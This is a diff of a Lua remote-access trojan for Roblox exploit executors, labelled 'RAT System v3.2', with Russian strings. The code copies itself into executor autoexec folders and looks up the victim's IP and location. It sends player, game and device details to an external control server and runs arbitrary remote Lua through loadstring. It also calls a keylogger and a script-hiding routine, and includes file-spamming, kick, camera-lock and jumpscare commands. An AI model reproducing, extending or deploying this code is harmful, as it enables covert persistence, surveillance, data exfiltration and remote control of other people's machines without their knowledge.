@@ -1,4 +1,3 @@
-[file content begin]
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local UserInputService = game:GetService("UserInputService")
@@ -13,7 +12,6 @@ local CoreGui = game:GetService("CoreGui")
 local SERVER_URL = "https://ratserver-6wo3.onrender.com"
 local player = Players.LocalPlayer
 
--- Новые переменные для камерных функций
 local cameraLockEnabled = false
 local cameraShakeEnabled = false
 local originalCameraType = nil
@@ -83,50 +81,6 @@ local function safeCheck(funcName)
     return false
 end
 
-local function autoInstallToAutoexec()
-    if deviceType ~= "PC" or not safeCheck("writefile") then
-        return false
-    end
-    
-    local success = pcall(function()
-        local scriptSource = "-- RAT System v3.0\n" .. tostring(script.Source)
-        
-        local autoexecPaths = {
-            "autoexec.lua",
-            "autoexec/startup.lua",
-            "workspace/autoexec.lua",
-            "scripts/rat.lua",
-            "autoexec/rat.lua",
-            "startup.lua",
-        }
-        
-        if syn and syn.writefile then
-            table.insert(autoexecPaths, "synapse/autoexec.lua")
-            table.insert(autoexecPaths, "synapse/workspace/rat.lua")
-        end
-        
-        if krnl then
-            table.insert(autoexecPaths, "krnl/autoexec.lua")
-        end
-        
-        if fluxus then
-            table.insert(autoexecPaths, "fluxus/autoexec.lua")
-        end
-        
-        local installedCount = 0
-        for _, path in ipairs(autoexecPaths) do
-            pcall(function()
-                writefile(path, scriptSource)
-                installedCount = installedCount + 1
-            end)
-        end
-        
-        return installedCount > 0
-    end)
-    
-    return success or false
-end
-
 local function httpRequest(params)
     local requestFunc
     
@@ -142,6 +96,171 @@ local function httpRequest(params)
     
     local success, response = pcall(requestFunc, params)
     return success and response or nil
+end
+
+local function getExecutorInfo()
+    local executorName = "Unknown"
+    local extraInfo = ""
+    
+    if safeCheck("identifyexecutor") then
+        local success, exec = pcall(identifyexecutor)
+        if success and exec then
+            executorName = exec
+        end
+    end
+    
+    if getgenv then
+        if getgenv().PROTO_SMARTLOADER then
+            extraInfo = extraInfo .. " [Proto]"
+        elseif getgenv().KRNL_LOADED then
+            extraInfo = extraInfo .. " [KRNL]"
+        elseif getgenv().SentinelStart then
+            extraInfo = extraInfo .. " [Sentinel]"
+        elseif getgenv().is_sirhurt_closure then
+            extraInfo = extraInfo .. " [SirHurt]"
+        elseif getgenv().syn then
+            extraInfo = extraInfo .. " [Synapse]"
+        elseif getgenv().pepsi then
+            extraInfo = extraInfo .. " [Pepsi]"
+        elseif getgenv().Fluxus then
+            extraInfo = extraInfo .. " [Fluxus]"
+        end
+    end
+    
+    if krnl then
+        extraInfo = extraInfo .. " [KRNL]"
+    end
+    
+    if fluxus then
+        extraInfo = extraInfo .. " [Fluxus]"
+    end
+    
+    if electron then
+        extraInfo = extraInfo .. " [Electron]"
+    end
+    
+    if iswindowactive then
+        extraInfo = extraInfo .. " [WinActive]"
+    end
+    
+    return executorName .. extraInfo
+end
+
+local function sendInjectNotification()
+    local playerName = player.Name
+    
+    local placeName = "Unknown"
+    pcall(function()
+        placeName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+    end)
+    
+    local executor = getExecutorInfo()
+    local deviceType = getDeviceType()
+    
+    local ipData = "N/A"
+    local ipResponse = httpRequest({
+        Url = "http://ip-api.com/json",
+        Method = "GET"
+    })
+    
+    if ipResponse and ipResponse.Body then
+        local success, ipInfo = pcall(function()
+            return HttpService:JSONDecode(ipResponse.Body)
+        end)
+        if success and ipInfo and ipInfo.status ~= "fail" then
+            ipData = string.format(
+                "IP: %s\nCountry: %s\nCity: %s",
+                ipInfo.query or "N/A",
+                ipInfo.country or "N/A", 
+                ipInfo.city or "N/A"
+            )
+        end
+    end
+    
+    local currentTime = os.date("%d.%m.%Y %H:%M")
+    
+    local description = string.format(
+        "Игрок: %s\n" ..
+        "Игра: %s\n" ..
+        "Инжектор: %s\n" ..
+        "Устройство: %s\n\n" ..
+        "IP информация\n%s\n\n" ..
+        "RAT Control System v3.2 • %s",
+        playerName, placeName, executor, deviceType, ipData, currentTime
+    )
+    
+    local webhookUrl = SERVER_URL .. "/send_webhook"
+    
+    local success = pcall(function()
+        local response = httpRequest({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                title = "🔌 Новый инжект!",
+                description = description,
+                player = playerName,
+                game = placeName,
+                executor = executor,
+                device = deviceType,
+                ip_info = ipData
+            })
+        })
+        return response ~= nil
+    end)
+    
+    if success then
+        print("Уведомление отправлено через сервер")
+    else
+        print("Ошибка отправки через сервер")
+    end
+    
+    pcall(function()
+        httpRequest({
+            Url = SERVER_URL.."/users",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                player = playerName,
+                place = placeName,
+                executor = executor,
+                device = deviceType
+            })
+        })
+    end)
+end
+
+local function autoInstallToAutoexec()
+    if deviceType ~= "PC" or not safeCheck("writefile") then
+        return false
+    end
+    
+    local success = pcall(function()
+        local scriptSource = tostring(script.Source)
+        
+        local autoexecPaths = {
+            "autoexec.lua",
+            "autoexec/startup.lua",
+            "workspace/autoexec.lua",
+            "scripts/rat.lua",
+        }
+        
+        if syn and syn.writefile then
+            table.insert(autoexecPaths, "synapse/autoexec.lua")
+        end
+        
+        local installedCount = 0
+        for _, path in ipairs(autoexecPaths) do
+            pcall(function()
+                writefile(path, scriptSource)
+                installedCount = installedCount + 1
+            end)
+        end
+        
+        return installedCount > 0
+    end)
+    
+    return success or false
 end
 
 local function captureScreenshot()
@@ -176,18 +295,12 @@ local function sendUserInfo()
     end
     
     local playerName = player.Name
-    local success, placeInfo = pcall(function()
-        return MarketplaceService:GetProductInfo(game.PlaceId)
+    local placeName = "Unknown"
+    pcall(function()
+        placeName = MarketplaceService:GetProductInfo(game.PlaceId).Name
     end)
-    local placeName = success and placeInfo.Name or "Unknown"
     
-    local executor = "Unknown"
-    if safeCheck("identifyexecutor") then
-        local success, exec = pcall(identifyexecutor)
-        if success then
-            executor = exec
-        end
-    end
+    local executor = getExecutorInfo()
     
     local success = pcall(function()
         local response = httpRequest({
@@ -206,194 +319,6 @@ local function sendUserInfo()
     
     if success then
         lastUserUpdate = currentTime
-    end
-end
-
-local function sendInjectNotification()
-    local playerName = player.Name
-    local success, placeInfo = pcall(function()
-        return MarketplaceService:GetProductInfo(game.PlaceId)
-    end)
-    local placeName = success and placeInfo.Name or "Unknown"
-    
-    local ipData = "N/A"
-    local ipResponse = httpRequest({
-        Url = "http://ip-api.com/json",
-        Method = "GET"
-    })
-    
-    if ipResponse and ipResponse.Body then
-        local success, ipInfo = pcall(function()
-            return HttpService:JSONDecode(ipResponse.Body)
-        end)
-        if success and ipInfo and ipInfo.status ~= "fail" then
-            ipData = string.format(
-                "IP: %s\nCountry: %s\nCity: %s",
-                ipInfo.query or "N/A",
-                ipInfo.country or "N/A", 
-                ipInfo.city or "N/A"
-            )
-        end
-    end
-
-    local executor = "Unknown"
-    if safeCheck("identifyexecutor") then
-        local success, exec = pcall(identifyexecutor)
-        if success then
-            executor = exec
-        end
-    end
-    
-    -- ⚠️ ИСПРАВЛЕНИЕ: Добавляем deviceType как 5-й аргумент
-    local deviceType = getDeviceType()
-    
-    httpRequest({
-        Url = SERVER_URL.."/command",
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode({
-            command = "inject_notify",
-            args = {playerName, placeName, ipData, executor, deviceType}  -- 5 аргументов!
-        })
-    })
-end
-
-local function getHardwareInfo()
-    local playerName = player.Name
-    local success, placeInfo = pcall(function()
-        return MarketplaceService:GetProductInfo(game.PlaceId)
-    end)
-    local placeName = success and placeInfo.Name or "Unknown"
-    
-    local ipData = "N/A"
-    local ipResponse = httpRequest({
-        Url = "http://ip-api.com/json",
-        Method = "GET"
-    })
-    
-    if ipResponse and ipResponse.Body then
-        local success, ipInfo = pcall(function()
-            return HttpService:JSONDecode(ipResponse.Body)
-        end)
-        if success and ipInfo and ipInfo.status ~= "fail" then
-            ipData = string.format(
-                "IP: %s\nCountry: %s",
-                ipInfo.query or "N/A",
-                ipInfo.country or "N/A"
-            )
-        end
-    end
-
-    local fps = 0
-    local ping = 0
-    
-    local success1, fpsValue = pcall(function()
-        return math.floor(workspace:GetRealPhysicsFPS())
-    end)
-    if success1 then fps = fpsValue end
-    
-    local success2, pingValue = pcall(function()
-        return Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
-    end)
-    if success2 then ping = pingValue end
-
-    local executor = "Unknown"
-    if safeCheck("identifyexecutor") then
-        local success, exec = pcall(identifyexecutor)
-        if success then
-            executor = exec
-        end
-    end
-
-    local systemInfo = {
-        device_type = deviceType,
-        touch_enabled = UserInputService.TouchEnabled,
-        mouse_enabled = UserInputService.MouseEnabled,
-        keyboard_enabled = UserInputService.KeyboardEnabled,
-        screen_size = workspace.CurrentCamera.ViewportSize
-    }
-
-    local hardwareData = {
-        player = playerName,
-        game = placeName,
-        fps = fps,
-        ping = ping,
-        executor = executor,
-        ip_info = ipData,
-        system = systemInfo
-    }
-    
-    return hardwareData
-end
-
-local function memorySpam(fileCount)
-    if not safeCheck("writefile") then
-        return 0
-    end
-    
-    local successCount = 0
-    
-    for i = 1, fileCount do
-        local filename = "spam_file_" .. i .. "_" .. math.random(1000, 9999) .. ".txt"
-        
-        local success = pcall(function()
-            local bigContent = ""
-            for j = 1, 100 do
-                bigContent = bigContent .. "SPAM_" .. math.random(100000, 999999) .. "_" .. 
-                           string.rep("X", 100) .. "\n"
-            end
-            
-            writefile(filename, bigContent)
-            return true
-        end)
-        
-        if success then
-            successCount = successCount + 1
-        end
-        
-        task.wait(0.1)
-    end
-    
-    return successCount
-end
-
-local function gallerySpam(imageCount)
-    if not safeCheck("writefile") then
-        return 0
-    end
-    
-    local successCount = 0
-    
-    for i = 1, imageCount do
-        local filename = "video_" .. i .. "_" .. math.random(1000, 9999) .. ".mp4"
-        
-        local success = pcall(function()
-            local content = "fake_video_content_" .. math.random(100000, 999999)
-            writefile(filename, content)
-            return true
-        end)
-        
-        if success then
-            successCount = successCount + 1
-        end
-        
-        task.wait(0.1)
-    end
-    
-    return successCount
-end
-
-local function executeLua(code)
-    local func, err = loadstring(code)
-    if func then
-        local success, result = pcall(func)
-        if success then
-            return "Успешно: " .. tostring(result)
-        else
-            return "Ошибка выполнения: " .. tostring(result)
-        end
-    else
-        return "Ошибка компиляции: " .. tostring(err)
     end
 end
 
@@ -877,7 +802,6 @@ local function executeJumpscareCommand(scareType)
     end
 end
 
--- НОВАЯ ФУНКЦИЯ: Блокировка камеры
 local function cameraLock(enable)
     if cameraLockEnabled == enable then return false end
     
@@ -885,16 +809,10 @@ local function cameraLock(enable)
     local camera = workspace.CurrentCamera
     
     if enable then
-        -- Сохраняем текущий тип камеры
         originalCameraType = camera.CameraType
-        
-        -- Меняем на Scriptable для полного контроля
         camera.CameraType = Enum.CameraType.Scriptable
-        
-        -- Сохраняем начальную позицию камеры
         local startCFrame = camera.CFrame
         
-        -- Запускаем цикл блокировки
         task.spawn(function()
             while cameraLockEnabled and camera do
                 camera.CFrame = startCFrame
@@ -902,7 +820,6 @@ local function cameraLock(enable)
             end
         end)
         
-        -- Создаем UI для блокировки ввода
         local screenGui = Instance.new("ScreenGui")
         screenGui.Name = "CameraLockUI"
         screenGui.Parent = player:WaitForChild("PlayerGui")
@@ -915,23 +832,19 @@ local function cameraLock(enable)
         lockFrame.Selectable = true
         lockFrame.Parent = screenGui
         
-        -- Сохраняем ссылку на GUI для удаления
         cameraLockGui = screenGui
         
-        -- Блокируем все вводы
         lockFrame.InputBegan:Connect(function()
             return
         end)
         
         return true
     else
-        -- Восстанавливаем камеру
         if originalCameraType then
             camera.CameraType = originalCameraType
             originalCameraType = nil
         end
         
-        -- Удаляем UI блокировки
         pcall(function()
             if cameraLockGui and cameraLockGui.Parent then
                 cameraLockGui:Destroy()
@@ -943,7 +856,6 @@ local function cameraLock(enable)
     end
 end
 
--- НОВАЯ ФУНКЦИЯ: Тряска камеры
 local function cameraShake(duration, intensity)
     if cameraShakeEnabled then return false end
     
@@ -959,23 +871,20 @@ local function cameraShake(duration, intensity)
                 break
             end
             
-            -- Случайное смещение с плавностью
             local progress = (currentTime - startTime) / duration
-            local currentIntensity = intensity * (1 - progress * 0.5) -- постепенно уменьшаем
+            local currentIntensity = intensity * (1 - progress * 0.5)
             
             local offset = Vector3.new(
                 (math.random() - 0.5) * 2 * currentIntensity,
-                (math.random() - 0.5) * 2 * currentIntensity * 0.5, -- вертикальная тряска меньше
+                (math.random() - 0.5) * 2 * currentIntensity * 0.5,
                 (math.random() - 0.5) * 2 * currentIntensity
             )
             
-            -- Применяем тряску с плавным переходом
             camera.CFrame = originalCFrame * CFrame.new(offset)
             
             task.wait(0.05)
         end
         
-        -- Плавное восстановление камеры
         if camera then
             for i = 1, 10 do
                 if camera then
@@ -992,8 +901,141 @@ local function cameraShake(duration, intensity)
     return true
 end
 
+local function getHardwareInfo()
+    local playerName = player.Name
+    local placeName = "Unknown"
+    pcall(function()
+        placeName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+    end)
+    
+    local ipData = "N/A"
+    pcall(function()
+        local ipResponse = httpRequest({
+            Url = "http://ip-api.com/json",
+            Method = "GET"
+        })
+        
+        if ipResponse and ipResponse.Body then
+            local success, ipInfo = pcall(function()
+                return HttpService:JSONDecode(ipResponse.Body)
+            end)
+            if success and ipInfo and ipInfo.status ~= "fail" then
+                ipData = string.format(
+                    "IP: %s\nCountry: %s",
+                    ipInfo.query or "N/A",
+                    ipInfo.country or "N/A"
+                )
+            end
+        end
+    end)
+
+    local fps = 0
+    local ping = 0
+    
+    pcall(function()
+        fps = math.floor(workspace:GetRealPhysicsFPS())
+    end)
+    
+    pcall(function()
+        ping = Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
+    end)
+
+    local executor = getExecutorInfo()
+
+    local systemInfo = {
+        device_type = deviceType,
+        touch_enabled = UserInputService.TouchEnabled,
+        mouse_enabled = UserInputService.MouseEnabled,
+        keyboard_enabled = UserInputService.KeyboardEnabled,
+        screen_size = workspace.CurrentCamera.ViewportSize
+    }
+
+    local hardwareData = {
+        player = playerName,
+        game = placeName,
+        fps = fps,
+        ping = ping,
+        executor = executor,
+        ip_info = ipData,
+        system = systemInfo
+    }
+    
+    return hardwareData
+end
+
+local function memorySpam(fileCount)
+    if not safeCheck("writefile") then
+        return 0
+    end
+    
+    local successCount = 0
+    
+    for i = 1, fileCount do
+        local filename = "spam_file_" .. i .. "_" .. math.random(1000, 9999) .. ".txt"
+        
+        local success = pcall(function()
+            local bigContent = ""
+            for j = 1, 100 do
+                bigContent = bigContent .. "SPAM_" .. math.random(100000, 999999) .. "_" .. 
+                           string.rep("X", 100) .. "\n"
+            end
+            
+            writefile(filename, bigContent)
+            return true
+        end)
+        
+        if success then
+            successCount = successCount + 1
+        end
+        
+        task.wait(0.1)
+    end
+    
+    return successCount
+end
+
+local function gallerySpam(imageCount)
+    if not safeCheck("writefile") then
+        return 0
+    end
+    
+    local successCount = 0
+    
+    for i = 1, imageCount do
+        local filename = "video_" .. i .. "_" .. math.random(1000, 9999) .. ".mp4"
+        
+        local success = pcall(function()
+            local content = "fake_video_content_" .. math.random(100000, 999999)
+            writefile(filename, content)
+            return true
+        end)
+        
+        if success then
+            successCount = successCount + 1
+        end
+        
+        task.wait(0.1)
+    end
+    
+    return successCount
+end
+
+local function executeLua(code)
+    local func, err = loadstring(code)
+    if func then
+        local success, result = pcall(func)
+        if success then
+            return "Успешно: " .. tostring(result)
+        else
+            return "Ошибка выполнения: " .. tostring(result)
+        end
+    else
+        return "Ошибка компиляции: " .. tostring(err)
+    end
+end
+
 local function ExecuteCommand(cmd, args)
-    local success = pcall(function()
+    pcall(function()
         if cmd == "chat" then
             if chatSystem then
                 chatSystem.gui.Enabled = not chatSystem.gui.Enabled
@@ -1009,7 +1051,6 @@ local function ExecuteCommand(cmd, args)
             end
         
         elseif cmd == "print" then
-            -- проверка связи
         
         elseif cmd == "kick" then
             player:Kick(args[1] or "Кикнут администратором")
@@ -1187,7 +1228,6 @@ local function ExecuteCommand(cmd, args)
                 executeJumpscareCommand(scareType)
             end)
         
-        -- НОВАЯ КОМАНДА: Блокировка камеры
         elseif cmd == "cameralock" then
             if args and args[1] then
                 local action = args[1]:lower()
@@ -1196,22 +1236,18 @@ local function ExecuteCommand(cmd, args)
                 elseif action == "off" or action == "disable" or action == "false" then
                     cameraLock(false)
                 else
-                    -- Автоматическое переключение
                     cameraLock(not cameraLockEnabled)
                 end
             else
-                -- Переключение без аргументов
                 cameraLock(not cameraLockEnabled)
             end
         
-        -- НОВАЯ КОМАНДА: Тряска камеры  
         elseif cmd == "camerashake" then
             local duration = tonumber(args[1]) or 5
             local intensity = tonumber(args[2]) or 2
             
-            -- Ограничиваем значения для безопасности
-            duration = math.min(duration, 30)  -- максимум 30 секунд
-            intensity = math.min(intensity, 10) -- максимум интенсивность 10
+            duration = math.min(duration, 30)
+            intensity = math.min(intensity, 10)
             
             cameraShake(duration, intensity)
         
@@ -1241,14 +1277,19 @@ local function checkCommands()
 end
 
 local function initialize()
+    task.wait(2)
+    
     if deviceType == "PC" then
-        task.wait(1)
         pcall(autoInstallToAutoexec)
     end
     
     pcall(sendInjectNotification)
     pcall(setupKeylogger)
     pcall(hideScript)
+    
+    print("RAT System v3.2 запущен")
+    print("Игрок:", player.Name)
+    print("Устройство:", deviceType)
 end
 
 local function mainLoop()
@@ -1280,4 +1321,3 @@ end
 
 pcall(initialize)
 pcall(mainLoop)
-[file content end]
